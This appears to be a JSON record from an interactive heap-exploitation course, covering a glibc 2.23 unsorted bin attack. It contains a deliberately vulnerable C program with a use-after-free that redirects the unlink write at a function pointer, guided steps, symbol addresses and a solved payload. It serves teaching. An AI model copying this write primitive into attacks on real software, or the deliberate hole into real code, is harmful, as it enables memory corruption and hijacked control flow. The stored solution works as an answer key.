{"exercise":"heap2-21","unit":"unit5-heap-ii","title":"21: Unsorted Bin Attack","desc":"When large chunks (bigger than 64 bytes) are freed, they go into the unsorted bin — a doubly-linked list with both forward (fd) and backward (bk) pointers. When a chunk is removed from the unsorted bin during malloc, the allocator writes the bin address to bk-&gt;fd. By corrupting the bk pointer via a UAF, you control where that write goes — a powerful arbitrary write primitive.","mode":"heap-unsorted-bin","vizMode":"heap","glibc":"2.23","heapSize":512,"base":134545408,"header":8,"mainArena":134525184,"funcPtrAddr":134520896,"symbols":{"main":134512640,"vuln":134512724,"win":134512976,"normal":134512800,"system":4158890496,"binsh":4160078592},"source":["#include <stdio.h>","#include <stdlib.h>","","void win() { printf(\"FLAG\\n\"); }","","void (**handler)();  // at 0x0804a040","","int main() {","    char *a = malloc(128);","    char *guard = malloc(16);","    // guard prevents top consolidation","    free(a);","    // a goes to unsorted bin","    // UAF: overwrite a's bk pointer","    *(void**)(a+4) = TARGET - 8;","    char *b = malloc(128);","    // Unlink writes main_arena to bk->fd","    // TARGET now has a non-zero value!","    (*handler)();","    return 0;","}"],"guided":[{"srcLine":5,"log":[["action","char *a = malloc(128) — chunk A is allocated (136 bytes with header)."]]},{"srcLine":6,"log":[["action","char *guard = malloc(16) — guard chunk prevents top consolidation."]]},{"srcLine":8,"log":[["action","free(a) — chunk A goes to the unsorted bin. A now has fd and bk pointers."]]},{"srcLine":10,"log":[["info","The program still has pointer a (UAF). When malloc removes a chunk from the unsorted bin, it writes main_arena to bk->fd."]]},{"srcLine":null,"log":[["info","Overwrite A's bk pointer so bk->fd points to the function pointer table. Set bk = funcPtrAddr - 8."]]}],"payloads":[[56,160,4,8]],"count":null,"completed":true,"check":true,"solved":true,"sourceOrderSetup":false,